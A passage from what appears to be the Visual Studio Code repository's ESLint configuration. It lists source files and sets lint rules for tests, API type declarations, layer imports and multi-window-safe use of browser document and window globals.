			'src/vs/workbench/contrib/extensions/electron-browser/runtimeExtensionsEditor.ts',
			'src/vs/workbench/contrib/inlineChat/browser/inlineChatActions.ts',
			'src/vs/workbench/contrib/inlineChat/browser/inlineChatController.ts',
			'src/vs/workbench/contrib/inlineChat/browser/inlineChatStrategies.ts',
			'src/vs/workbench/contrib/markdown/browser/markdownDocumentRenderer.ts',
			'src/vs/workbench/contrib/markers/browser/markers.contribution.ts',
			'src/vs/workbench/contrib/markers/browser/markersView.ts',
			'src/vs/workbench/contrib/mergeEditor/browser/commands/commands.ts',
			'src/vs/workbench/contrib/mergeEditor/browser/utils.ts',
			'src/vs/workbench/contrib/mergeEditor/browser/view/editorGutter.ts',
			'src/vs/workbench/contrib/mergeEditor/browser/view/mergeEditor.ts',
			'src/vs/workbench/contrib/notebook/browser/contrib/clipboard/notebookClipboard.ts',
			'src/vs/workbench/contrib/notebook/browser/contrib/find/notebookFind.ts',
			'src/vs/workbench/contrib/notebook/browser/contrib/layout/layoutActions.ts',
			'src/vs/workbench/contrib/notebook/browser/contrib/profile/notebookProfile.ts',
			'src/vs/workbench/contrib/notebook/browser/contrib/troubleshoot/layout.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/chat/cellChatActions.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/coreActions.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/editActions.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/notebookIndentationActions.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/sectionActions.ts',
			'src/vs/workbench/contrib/notebook/browser/diff/diffComponents.ts',
			'src/vs/workbench/contrib/notebook/browser/diff/inlineDiff/notebookDeletedCellDecorator.ts',
			'src/vs/workbench/contrib/notebook/browser/notebookBrowser.ts',
			'src/vs/workbench/contrib/notebook/browser/outputEditor/notebookOutputEditor.ts',
			'src/vs/workbench/contrib/notebook/browser/services/notebookEditorServiceImpl.ts',
			'src/vs/workbench/contrib/notebook/browser/view/notebookCellList.ts',
			'src/vs/workbench/contrib/notebook/browser/view/renderers/backLayerWebView.ts',
			'src/vs/workbench/contrib/notebook/browser/view/renderers/webviewMessages.ts',
			'src/vs/workbench/contrib/notebook/browser/view/renderers/webviewPreloads.ts',
			'src/vs/workbench/contrib/notebook/browser/viewModel/markupCellViewModel.ts',
			'src/vs/workbench/contrib/notebook/browser/viewParts/notebookEditorStickyScroll.ts',
			'src/vs/workbench/contrib/notebook/browser/viewParts/notebookHorizontalTracker.ts',
			'src/vs/workbench/contrib/notebook/browser/viewParts/notebookKernelQuickPickStrategy.ts',
			'src/vs/workbench/contrib/notebook/common/model/notebookCellTextModel.ts',
			'src/vs/workbench/contrib/notebook/common/model/notebookMetadataTextModel.ts',
			'src/vs/workbench/contrib/notebook/common/model/notebookTextModel.ts',
			'src/vs/workbench/contrib/notebook/common/notebookCommon.ts',
			'src/vs/workbench/contrib/notebook/common/notebookEditorModelResolverServiceImpl.ts',
			'src/vs/workbench/contrib/notebook/test/browser/testNotebookEditor.ts',
			'src/vs/workbench/contrib/performance/electron-browser/startupProfiler.ts',
			'src/vs/workbench/contrib/preferences/browser/preferences.contribution.ts',
			'src/vs/workbench/contrib/preferences/browser/preferencesRenderers.ts',
			'src/vs/workbench/contrib/preferences/browser/settingsEditor2.ts',
			'src/vs/workbench/contrib/preferences/browser/settingsTree.ts',
			'src/vs/workbench/contrib/preferences/browser/settingsTreeModels.ts',
			'src/vs/workbench/contrib/remote/browser/tunnelView.ts',
			'src/vs/workbench/contrib/search/browser/AISearch/aiSearchModel.ts',
			'src/vs/workbench/contrib/search/browser/AISearch/aiSearchModelBase.ts',
			'src/vs/workbench/contrib/search/browser/notebookSearch/notebookSearchModel.ts',
			'src/vs/workbench/contrib/search/browser/notebookSearch/notebookSearchModelBase.ts',
			'src/vs/workbench/contrib/search/browser/notebookSearch/searchNotebookHelpers.ts',
			'src/vs/workbench/contrib/search/browser/replace.ts',
			'src/vs/workbench/contrib/search/browser/replaceService.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsCopy.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsBase.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsFind.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsNav.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsRemoveReplace.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsTextQuickAccess.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsTopBar.ts',
			'src/vs/workbench/contrib/search/browser/searchMessage.ts',
			'src/vs/workbench/contrib/search/browser/searchResultsView.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/fileMatch.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/folderMatch.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/searchModel.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/searchResult.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/searchTreeCommon.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/textSearchHeading.ts',
			'src/vs/workbench/contrib/search/browser/searchView.ts',
			'src/vs/workbench/contrib/search/test/browser/mockSearchTree.ts',
			'src/vs/workbench/contrib/searchEditor/browser/searchEditor.contribution.ts',
			'src/vs/workbench/contrib/searchEditor/browser/searchEditorActions.ts',
			'src/vs/workbench/contrib/searchEditor/browser/searchEditorInput.ts',
			'src/vs/workbench/contrib/snippets/browser/commands/configureSnippets.ts',
			'src/vs/workbench/contrib/snippets/browser/commands/insertSnippet.ts',
			'src/vs/workbench/contrib/snippets/browser/snippetsService.ts',
			'src/vs/workbench/contrib/testing/common/storedValue.ts',
			'src/vs/workbench/contrib/testing/test/browser/testObjectTree.ts',
			'src/vs/workbench/contrib/typeHierarchy/browser/typeHierarchy.contribution.ts',
			'src/vs/workbench/contrib/typeHierarchy/common/typeHierarchy.ts',
			'src/vs/workbench/contrib/webview/browser/overlayWebview.ts',
			'src/vs/workbench/contrib/webview/browser/webview.ts',
			'src/vs/workbench/contrib/webview/browser/webviewElement.ts',
			'src/vs/workbench/contrib/webviewPanel/browser/webviewEditor.ts',
			'src/vs/workbench/contrib/webviewPanel/browser/webviewEditorInputSerializer.ts',
			'src/vs/workbench/contrib/webviewPanel/browser/webviewWorkbenchService.ts',
			'src/vs/workbench/contrib/welcomeGettingStarted/browser/gettingStartedService.ts',
			'src/vs/workbench/contrib/welcomeWalkthrough/browser/walkThroughPart.ts',
			'src/vs/workbench/services/authentication/common/authentication.ts',
			'src/vs/workbench/services/authentication/test/browser/authenticationQueryServiceMocks.ts',
			'src/vs/workbench/services/commands/common/commandService.ts',
			'src/vs/workbench/services/configurationResolver/common/configurationResolver.ts',
			'src/vs/workbench/services/configurationResolver/common/configurationResolverExpression.ts',
			'src/vs/workbench/services/extensions/common/extensionHostManager.ts',
			'src/vs/workbench/services/extensions/common/extensionsRegistry.ts',
			'src/vs/workbench/services/extensions/common/lazyPromise.ts',
			'src/vs/workbench/services/extensions/common/polyfillNestedWorker.protocol.ts',
			'src/vs/workbench/services/extensions/common/rpcProtocol.ts',
			'src/vs/workbench/services/extensions/worker/polyfillNestedWorker.ts',
			'src/vs/workbench/services/keybinding/browser/keybindingService.ts',
			'src/vs/workbench/services/keybinding/browser/keyboardLayoutService.ts',
			'src/vs/workbench/services/keybinding/common/keybindingEditing.ts',
			'src/vs/workbench/services/keybinding/common/keymapInfo.ts',
			'src/vs/workbench/services/language/common/languageService.ts',
			'src/vs/workbench/services/outline/browser/outline.ts',
			'src/vs/workbench/services/outline/browser/outlineService.ts',
			'src/vs/workbench/services/preferences/common/preferences.ts',
			'src/vs/workbench/services/preferences/common/preferencesModels.ts',
			'src/vs/workbench/services/preferences/common/preferencesValidation.ts',
			'src/vs/workbench/services/remote/common/tunnelModel.ts',
			'src/vs/workbench/services/search/common/replace.ts',
			'src/vs/workbench/services/search/common/search.ts',
			'src/vs/workbench/services/search/common/searchExtConversionTypes.ts',
			'src/vs/workbench/services/search/common/searchExtTypes.ts',
			'src/vs/workbench/services/search/node/fileSearch.ts',
			'src/vs/workbench/services/search/node/rawSearchService.ts',
			'src/vs/workbench/services/search/node/ripgrepTextSearchEngine.ts',
			'src/vs/workbench/services/textMate/common/TMGrammarFactory.ts',
			'src/vs/workbench/services/themes/browser/fileIconThemeData.ts',
			'src/vs/workbench/services/themes/browser/productIconThemeData.ts',
			'src/vs/workbench/services/themes/common/colorThemeData.ts',
			'src/vs/workbench/services/themes/common/plistParser.ts',
			'src/vs/workbench/services/themes/common/themeExtensionPoints.ts',
			'src/vs/workbench/services/themes/common/workbenchThemeService.ts',
			'src/vs/workbench/test/browser/workbenchTestServices.ts',
			'src/vs/workbench/test/common/workbenchTestServices.ts',
			'src/vs/workbench/test/electron-browser/workbenchTestServices.ts',
			// Server
			'src/vs/server/node/remoteAgentEnvironmentImpl.ts',
			'src/vs/server/node/remoteExtensionHostAgentServer.ts',
			'src/vs/server/node/remoteExtensionsScanner.ts',
			// Tests
			'**/*.test.ts',
			'**/*.integrationTest.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'@typescript-eslint': tseslint.plugin,
		},
		rules: {
			'@typescript-eslint/no-explicit-any': [
				'warn',
				{
					'fixToUnknown': false
				}
			]
		}
	},
	// Tests
	{
		files: [
			'**/*.test.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-dangerous-type-assertions': 'off',
			'local/code-must-use-super-dispose': 'off',
			'local/code-no-test-only': 'error',
			'local/code-no-test-async-suite': 'warn',
			'local/code-must-use-result': [
				'warn',
				[
					{
						'message': 'Expression must be awaited',
						'functions': [
							'assertSnapshot',
							'assertHeap'
						]
					}
				]
			]
		}
	},
	// vscode tests specific rules
	{
		files: [
			'src/vs/**/*.test.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-ensure-no-disposables-leak-in-test': [
				'warn',
				{
					// Files should (only) be removed from the list they adopt the leak detector
					'exclude': [
						'src/vs/workbench/services/userActivity/test/browser/domActivityTracker.test.ts',
					]
				}
			]
		}
	},
	// git extension - ban non-type imports from git.d.ts (use git.constants for runtime values)
	{
		files: [
			'extensions/git/src/**/*.ts',
		],
		ignores: [
			'extensions/git/src/api/git.constants.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'@typescript-eslint': tseslint.plugin,
		},
		rules: {
			'no-restricted-imports': 'off',
			'@typescript-eslint/no-restricted-imports': [
				'warn',
				{
					'patterns': [
						{
							'group': ['*/api/git'],
							'allowTypeImports': true,
							'message': 'Use \'import type\' for types from git.d.ts and import runtime const enum values from git.constants instead'
						},
					]
				}
			]
		}
	},
	// vscode API
	{
		files: [
			'**/vscode.d.ts',
			'**/vscode.proposed.*.d.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'no-restricted-syntax': [
				'warn',
				{
					'selector': `TSArrayType > TSUnionType`,
					'message': 'Use Array<...> for arrays of union types.'
				},
			],
			'local/vscode-dts-create-func': 'warn',
			'local/vscode-dts-literal-or-types': 'warn',
			'local/vscode-dts-string-type-literals': 'warn',
			'local/vscode-dts-interface-naming': 'warn',
			'local/vscode-dts-cancellation': 'warn',
			'local/vscode-dts-use-export': 'warn',
			'local/vscode-dts-use-thenable': 'warn',
			'local/vscode-dts-vscode-in-comments': 'warn',
			'local/vscode-dts-provider-naming': [
				'warn',
				{
					'allowed': [
						'FileSystemProvider',
						'TreeDataProvider',
						'TestProvider',
						'CustomEditorProvider',
						'CustomReadonlyEditorProvider',
						'TerminalLinkProvider',
						'AuthenticationProvider',
						'NotebookContentProvider'
					]
				}
			],
			'local/vscode-dts-event-naming': [
				'warn',
				{
					'allowed': [
						'onCancellationRequested',
						'event'
					],
					'verbs': [
						'accept',
						'archive',
						'change',
						'close',
						'collapse',
						'create',
						'delete',
						'lock',
						'resume',
						'shutdown',
						'suspend',
						'unlock',
						'discover',
						'dispose',
						'drop',
						'edit',
						'end',
						'execute',
						'expand',
						'grant',
						'hide',
						'invalidate',
						'open',
						'override',
						'perform',
						'receive',
						'register',
						'remove',
						'rename',
						'save',
						'send',
						'start',
						'terminate',
						'trigger',
						'unregister',
						'write',
						'commit'
					]
				}
			]
		}
	},
	// vscode.d.ts
	{
		files: [
			'**/vscode.d.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		rules: {
			'jsdoc/tag-lines': 'off',
			'jsdoc/valid-types': 'off',
			'jsdoc/no-multi-asterisks': [
				'warn',
				{
					'allowWhitespace': true
				}
			],
			'jsdoc/require-jsdoc': [
				'warn',
				{
					'enableFixer': false,
					'contexts': [
						'TSInterfaceDeclaration',
						'TSPropertySignature',
						'TSMethodSignature',
						'TSDeclareFunction',
						'ClassDeclaration',
						'MethodDefinition',
						'PropertyDeclaration',
						'TSEnumDeclaration',
						'TSEnumMember',
						'ExportNamedDeclaration'
					]
				}
			],
			'jsdoc/check-param-names': [
				'warn',
				{
					'enableFixer': false,
					'checkDestructured': false
				}
			],
			'jsdoc/require-returns': 'warn'
		}
	},
	// common/browser layer
	{
		files: [
			'src/**/{common,browser}/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-amd-node-module': 'warn'
		}
	},
	// node/electron layer
	{
		files: [
			'src/*.ts',
			'src/**/{node,electron-main,electron-utility}/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'no-restricted-globals': [
				'warn',
				'name',
				'length',
				'event',
				'closed',
				'external',
				'status',
				'origin',
				'orientation',
				'context',
				// Below are globals that are unsupported in ESM
				'__dirname',
				'__filename',
				'require'
			]
		}
	},
	// electron-main layer: prevent static imports of heavy node_modules
	// that would be synchronously loaded on startup
	{
		files: [
			'src/vs/code/electron-main/**/*.ts',
			'src/vs/code/node/**/*.ts',
			'src/vs/platform/*/electron-main/**/*.ts',
			'src/vs/platform/*/node/**/*.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-static-node-module-import': [
				'error',
				// Files that run in separate processes, not on the electron-main startup path
				'src/vs/platform/agentHost/node/**/*.ts',
				'src/vs/platform/files/node/watcher/**/*.ts',
				'src/vs/platform/terminal/node/**/*.ts',
				// Files that use small, safe modules
				'src/vs/platform/environment/node/argv.ts',
			]
		}
	},
	// browser/electron-browser layer
	{
		files: [
			'src/**/{browser,electron-browser}/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-global-document-listener': 'warn',
			'no-restricted-syntax': [
				'warn',
				{
					'selector': `NewExpression[callee.object.name='Intl']`,
					'message': 'Use safeIntl helper instead for safe and lazy use of potentially expensive Intl methods.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name='MouseEvent']`,
					'message': 'Use DOM.isMouseEvent() to support multi-window scenarios.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name=/^HTML\\w+/]`,
					'message': 'Use DOM.isHTMLElement() and related methods to support multi-window scenarios.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name=/^SVG\\w+/]`,
					'message': 'Use DOM.isSVGElement() and related methods to support multi-window scenarios.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name='KeyboardEvent']`,
					'message': 'Use DOM.isKeyboardEvent() to support multi-window scenarios.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name='PointerEvent']`,
					'message': 'Use DOM.isPointerEvent() to support multi-window scenarios.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name='DragEvent']`,
					'message': 'Use DOM.isDragEvent() to support multi-window scenarios.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='activeElement']`,
					'message': 'Use <targetWindow>.document.activeElement to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='contains']`,
					'message': 'Use <targetWindow>.document.contains to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='styleSheets']`,
					'message': 'Use <targetWindow>.document.styleSheets to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='fullscreenElement']`,
					'message': 'Use <targetWindow>.document.fullscreenElement to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='body']`,
					'message': 'Use <targetWindow>.document.body to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='addEventListener']`,
					'message': 'Use <targetWindow>.document.addEventListener to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='removeEventListener']`,
					'message': 'Use <targetWindow>.document.removeEventListener to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='hasFocus']`,
					'message': 'Use <targetWindow>.document.hasFocus to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='head']`,
					'message': 'Use <targetWindow>.document.head to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='exitFullscreen']`,
					'message': 'Use <targetWindow>.document.exitFullscreen to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getElementById']`,
					'message': 'Use <targetWindow>.document.getElementById to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getElementsByClassName']`,
					'message': 'Use <targetWindow>.document.getElementsByClassName to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getElementsByName']`,
					'message': 'Use <targetWindow>.document.getElementsByName to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getElementsByTagName']`,
					'message': 'Use <targetWindow>.document.getElementsByTagName to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getElementsByTagNameNS']`,
					'message': 'Use <targetWindow>.document.getElementsByTagNameNS to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getSelection']`,
					'message': 'Use <targetWindow>.document.getSelection to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='open']`,
					'message': 'Use <targetWindow>.document.open to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='close']`,
					'message': 'Use <targetWindow>.document.close to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='documentElement']`,
					'message': 'Use <targetWindow>.document.documentElement to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='visibilityState']`,
					'message': 'Use <targetWindow>.document.visibilityState to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='querySelector']`,
					'message': 'Use <targetWindow>.document.querySelector to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='querySelectorAll']`,
					'message': 'Use <targetWindow>.document.querySelectorAll to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='elementFromPoint']`,
					'message': 'Use <targetWindow>.document.elementFromPoint to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='elementsFromPoint']`,
					'message': 'Use <targetWindow>.document.elementsFromPoint to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='onkeydown']`,
					'message': 'Use <targetWindow>.document.onkeydown to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='onkeyup']`,
					'message': 'Use <targetWindow>.document.onkeyup to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='onmousedown']`,
					'message': 'Use <targetWindow>.document.onmousedown to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='onmouseup']`,
					'message': 'Use <targetWindow>.document.onmouseup to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='execCommand']`,
					'message': 'Use <targetWindow>.document.execCommand to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'querySelector\']',
					'message': 'querySelector should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'querySelectorAll\']',
					'message': 'querySelectorAll should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'getElementById\']',
					'message': 'getElementById should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'getElementsByClassName\']',
					'message': 'getElementsByClassName should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'getElementsByTagName\']',
					'message': 'getElementsByTagName should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'getElementsByName\']',
					'message': 'getElementsByName should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'getElementsByTagNameNS\']',
					'message': 'getElementsByTagNameNS should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				}
			],
			'no-restricted-globals': [
				'warn',
				'name',
				'length',
				'event',
				'closed',
				'external',
				'status',
				'origin',
				'orientation',
				'context',
				{
					'name': 'setInterval',
					'message': 'Use <targetWindow>.setInterval to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'clearInterval',
					'message': 'Use <targetWindow>.clearInterval to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'requestAnimationFrame',
					'message': 'Use <targetWindow>.requestAnimationFrame to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'cancelAnimationFrame',
					'message': 'Use <targetWindow>.cancelAnimationFrame to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'requestIdleCallback',
					'message': 'Use <targetWindow>.requestIdleCallback to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'cancelIdleCallback',
					'message': 'Use <targetWindow>.cancelIdleCallback to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'window',
					'message': 'Use <targetWindow> to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'addEventListener',
					'message': 'Use <targetWindow>.addEventListener to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'removeEventListener',
					'message': 'Use <targetWindow>.removeEventListener to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'getComputedStyle',
					'message': 'Use <targetWindow>.getComputedStyle to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'focus',
					'message': 'Use <targetWindow>.focus to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'blur',
					'message': 'Use <targetWindow>.blur to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'close',
					'message': 'Use <targetWindow>.close to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'dispatchEvent',
					'message': 'Use <targetWindow>.dispatchEvent to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'getSelection',
					'message': 'Use <targetWindow>.getSelection to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'matchMedia',
					'message': 'Use <targetWindow>.matchMedia to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'open',
					'message': 'Use <targetWindow>.open to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'parent',
					'message': 'Use <targetWindow>.parent to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'postMessage',
					'message': 'Use <targetWindow>.postMessage to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'devicePixelRatio',
					'message': 'Use <targetWindow>.devicePixelRatio to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'frames',
					'message': 'Use <targetWindow>.frames to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'frameElement',
					'message': 'Use <targetWindow>.frameElement to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'innerHeight',
					'message': 'Use <targetWindow>.innerHeight to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'innerWidth',
					'message': 'Use <targetWindow>.innerWidth to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'outerHeight',
					'message': 'Use <targetWindow>.outerHeight to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'outerWidth',
					'message': 'Use <targetWindow>.outerWidth to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'opener',
